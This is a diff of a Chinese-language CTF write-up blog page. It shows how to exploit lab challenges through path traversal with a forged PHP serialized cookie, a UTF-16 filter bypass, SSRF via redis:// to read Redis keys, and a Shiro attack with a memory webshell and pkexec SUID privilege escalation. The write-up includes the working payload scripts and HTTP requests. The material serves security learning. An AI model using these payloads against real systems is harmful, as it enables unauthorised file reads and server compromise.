+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194313200-1774890724145-21.png" srcset="/img/loading.gif" lazyload alt="image-20260324194313200"></p>
 <p>而<code>$rawPath</code>就是<code>$user-&gt;basePath</code>和<code>$f</code>的拼接结果，这里是最重要的，意味着之前的想法是可能实现的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194331771.png" srcset="/img/loading.gif" lazyload alt="image-20260324194331771"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194331771-1774890724145-22.png" srcset="/img/loading.gif" lazyload alt="image-20260324194331771"></p>
 <p>并且过滤了一些字符串，也不能大小写绕过</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195717419.png" srcset="/img/loading.gif" lazyload alt="image-20260324195717419"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195717419-1774890724145-23.png" srcset="/img/loading.gif" lazyload alt="image-20260324195717419"></p>
 <p>这里<code>basePath</code>就是从Cookie中提取的<code>basePath</code>属性的值，<code>$f</code>是通过 GET 方式传入的<code>f</code>参数</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195806407.png" srcset="/img/loading.gif" lazyload alt="image-20260324195806407"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195806407-1774890724145-24.png" srcset="/img/loading.gif" lazyload alt="image-20260324195806407"></p>
 <p>这里尝试一下，将<code>basePath</code>修改为空，注意要进行URL编码，然后<code>f</code>改为<code>/etc/passwd</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/preview.php?f=/etc/passwd</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:32349<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge.imxbt.cn:32349/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>visited=yes; user=O%3a4%3a&quot;User&quot;%3a3%3a&#123;s%3a4%3a&quot;name&quot;%3bs%3a5%3a&quot;guest&quot;%3bs%3a8%3a&quot;encoding&quot;%3bs%3a5%3a&quot;UTF-8&quot;%3bs%3a8%3a&quot;basePath&quot;%3bs%3a0%3a&quot;&quot;%3b&#125;<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><br></code></pre></td></tr></table></figure>
 
 <p>没问题，想法可行，确实存在漏洞</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202321726.png" srcset="/img/loading.gif" lazyload alt="image-20260324202321726"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202321726-1774890724145-25.png" srcset="/img/loading.gif" lazyload alt="image-20260324202321726"></p>
 <p>至于另一个<code>download.php</code>中是没有使用<code>basePath</code>，而是用的写死的<code>/var/www/html/uploads</code>，也就不存在漏洞</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200300183.png" srcset="/img/loading.gif" lazyload alt="image-20260324200300183"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200300183-1774890724145-26.png" srcset="/img/loading.gif" lazyload alt="image-20260324200300183"></p>
 <p>到了这里我就想到了修，是不是可以直接将<code>preview.php</code>中的像<code>download.php</code>中的一样写死路径，就可以check成功了，事实证明是可以的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200529019.png" srcset="/img/loading.gif" lazyload alt="image-20260324200529019"></p>
-<h2 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h2><p>然后是打，直接读根目录下的flag是不行的，因为过滤了<code>flag</code>关键词，也不能大小写绕过，当时想到了利用编码转换来进行绕过，因为这题存在编码转换的功能的，但是当时没看到源码中的，一直以为是下面这里</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202622475.png" srcset="/img/loading.gif" lazyload alt="image-20260324202622475"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200529019-1774890724145-27.png" srcset="/img/loading.gif" lazyload alt="image-20260324200529019"></p>
+<h3 id="Break-1"><a href="#Break-1" class="headerlink" title="Break"></a>Break</h3><p>然后是打，直接读根目录下的flag是不行的，因为过滤了<code>flag</code>关键词，也不能大小写绕过，当时想到了利用编码转换来进行绕过，因为这题存在编码转换的功能的，但是当时没看到源码中的，一直以为是下面这里</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202622475-1774890724145-28.png" srcset="/img/loading.gif" lazyload alt="image-20260324202622475"></p>
 <p>关键是下面这部分，可以将Cookie中的<code>user</code>的编码转化为UTF-8编码</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324201024177.png" srcset="/img/loading.gif" lazyload alt="image-20260324201024177"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324201024177-1774890724145-29.png" srcset="/img/loading.gif" lazyload alt="image-20260324201024177"></p>
 <p>所以只要将<code>/flag</code>转化为其他编码，比如<code>UTF-16</code>就可以绕过了，因为会有些不可见字符，所以URL编码一下，转换脚本：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br><span class="hljs-variable">$convertedPath</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;UTF-16&quot;</span>, <span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$convertedPath</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># 运行结果：%FE%FF%00%2F%00f%00l%00a%00g</span><br></code></pre></td></tr></table></figure>
 
 <p>还有就是Cookie中的也编码为UTF-16，可以根据<code>lib</code>目录下的<code>User.php</code>内容修改</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202856392.png" srcset="/img/loading.gif" lazyload alt="image-20260324202856392"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202856392-1774890724145-30.png" srcset="/img/loading.gif" lazyload alt="image-20260324202856392"></p>
 <p>脚本：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$encoding</span> = <span class="hljs-string">&quot;UTF-16&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$basePath</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>()));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># 运行结果：O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22encoding%22%3Bs%3A6%3A%22UTF-16%22%3Bs%3A8%3A%22basePath%22%3Bs%3A0%3A%22%22%3B%7D</span><br></code></pre></td></tr></table></figure>
 
@@ -550,7 +567,56 @@
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/preview.php?f=%FE%FF%00%2F%00f%00l%00a%00g</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:32349<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challenge.imxbt.cn:32349/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>visited=yes; user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22encoding%22%3Bs%3A6%3A%22UTF-16%22%3Bs%3A8%3A%22basePath%22%3Bs%3A0%3A%22%22%3B%7D<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><br></code></pre></td></tr></table></figure>
 
 <p>成功绕过获取flag</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202943000.png" srcset="/img/loading.gif" lazyload alt="image-20260324202943000"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202943000-1774890724145-31.png" srcset="/img/loading.gif" lazyload alt="image-20260324202943000"></p>
+<h2 id="IntraBadge"><a href="#IntraBadge" class="headerlink" title="IntraBadge"></a>IntraBadge</h2><h3 id="Break-2"><a href="#Break-2" class="headerlink" title="Break"></a>Break</h3><blockquote>
+<p>没招了，codex五分钟秒了，跟着AI写的WP复现了</p>
+</blockquote>
+<p>漏洞点是在<code>utils.py</code>中的<code>fetch_resource()</code>函数中存在SSRF，这里可以使用<code>redis://</code>协议，可以通过这个点连接到靶机的 Redis 服务，并读取任意键</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326183840521.png" srcset="/img/loading.gif" lazyload alt="image-20260326183840521"></p>
+<p>然后去找哪里会调用到这个函数，在<code>app.py</code>中，可以找到在<code>/avatar/refresh</code>路由中，这个路由是用来从外部URL获取用户头像的，并将其存储到 Redis 数据库中，无论指定的URL指向什么，返回的内容都会放在<code>avatarbin:&#123;user&#125;</code>和<code>avatarctype:&#123;user&#125;</code>中</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326184121408.png" srcset="/img/loading.gif" lazyload alt="image-20260326184121408"></p>
+<p>在<code>/preview</code>中就直接将其暴露给用户模板了</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326185851972.png" srcset="/img/loading.gif" lazyload alt="image-20260326185851972"></p>
+<p>所以可以将任意 Redis 键的内容缓存为“头像”，再把模板改成<code>&#123;&#123; avatar_raw_text() &#125;&#125;</code>，即可在 <code>/preview</code> 页面直接读出 Redis 键值</p>
+<p>修改模板的话可以利用<code>/template</code>路由实现</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326190209064.png" srcset="/img/loading.gif" lazyload alt="image-20260326190209064"></p>
+<p>在<code>/debug/diag</code>也是存在提示的（下面是翻译后的结果），就是利用缓存头像，并且告知了 Redis 在<code>127.0.0.1:6379</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326190456312.png" srcset="/img/loading.gif" lazyload alt="image-20260326190456312"></p>
+<p>先修改模板内容，可以先在<code>/preview</code>路由中看一下头像是什么，可以看到现在默认设置的是<code>No Avatar</code>，点击<code>Edit Template</code>按钮编辑模板</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191357977.png" srcset="/img/loading.gif" lazyload alt="image-20260326191357977"></p>
+<p>找到<code>No Avatar</code>，将其替换为<code>&#123;&#123; avatar_raw_text() &#125;&#125;</code>后<code>save</code>保存</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191538072.png" srcset="/img/loading.gif" lazyload alt="image-20260326191538072"></p>
+<p>然后来到<code>/dashboard</code>路由，修改头像的URL地址为<code>redis://127.0.0.1:6379/0/flag</code>，也就是去读<code>flag</code>键，然后<code>Save URL</code>保存，再<code>Refresh Cache</code>刷新下头像缓存，让后端去读<code>flag</code>键</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191739599.png" srcset="/img/loading.gif" lazyload alt="image-20260326191739599"></p>
+<p>最后回到<code>/preview</code>就可以在头像地方看到flag了</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191930028.png" srcset="/img/loading.gif" lazyload alt="image-20260326191930028"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191954730.png" srcset="/img/loading.gif" lazyload alt="image-20260326191954730"></p>
+<h3 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h3><p>修这个的话我想到的是直接禁用掉<code>redis://</code>协议，或者把flag键给加个waf过滤掉，或者对头像的URL限制不能用回环地址，或者直接删掉<code>avatar_raw_text()</code>和<code>avatar_raw_b64()</code>这俩函数，没有<code>check</code>环境就不能复现试试了</p>
+<h2 id="wso2"><a href="#wso2" class="headerlink" title="wso2"></a>wso2</h2><h3 id="Break-3"><a href="#Break-3" class="headerlink" title="Break"></a>Break</h3><p>…</p>
+<h3 id="Fix-3"><a href="#Fix-3" class="headerlink" title="Fix"></a>Fix</h3><p>当时比赛的时候好像直接<code>rm /flag</code>就可以过了</p>
+<h1 id="ISW"><a href="#ISW" class="headerlink" title="ISW"></a>ISW</h1><h2 id="ISW3"><a href="#ISW3" class="headerlink" title="ISW3"></a>ISW3</h2><blockquote>
+<p>复现平台的就提供了开始的Shiro和pkexec提权</p>
+</blockquote>
+<p>开始很容易可以看出是Shiro的，当时比赛时的截图：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194522409.png" srcset="/img/loading.gif" lazyload alt="image-20260326194522409"></p>
+<p>直接用工具打</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194246085.png" srcset="/img/loading.gif" lazyload alt="image-20260326194246085"></p>
+<p>写入冰蝎的内存马</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194307601.png" srcset="/img/loading.gif" lazyload alt="image-20260326194307601"></p>
+<p>用冰蝎连接</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194359453.png" srcset="/img/loading.gif" lazyload alt="image-20260326194359453"></p>
+<p>第一个flag就是在根目录下的<code>flag</code>文件中</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194438768.png" srcset="/img/loading.gif" lazyload alt="image-20260326194438768"></p>
+<p>然后是提权，可以SUID提权，利用pkexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194856639.png" srcset="/img/loading.gif" lazyload alt="image-20260326194856639"></p>
+<p>但是这个复现环境搭的有点问题，pkexec打不通，不过我自己搭了单独的复现环境，写了笔记：<a href="https://yschen20.github.io/2026/03/23/pkexec%E6%8F%90%E6%9D%83%EF%BC%88CVE-2021-4034%EF%BC%89/">https://yschen20.github.io/2026/03/23/pkexec%E6%8F%90%E6%9D%83%EF%BC%88CVE-2021-4034%EF%BC%89/</a></p>
+<p>这题第二部分的flag在root目录下，不过环境变量没删，想要这题的flag的话就直接<code>env</code>了<img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326232208581.png" srcset="/img/loading.gif" lazyload alt="image-20260326232208581"></p>
+<p>再之后的横向就没环境了</p>
+<blockquote>
+<p>当时比赛的时候就打Shiro进来了，提权也没看出来</p>
+</blockquote>
 
                 
               </div>
@@ -615,7 +681,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年3月24日</div>
+          <div>2026年3月31日</div>
         </div>
       
       
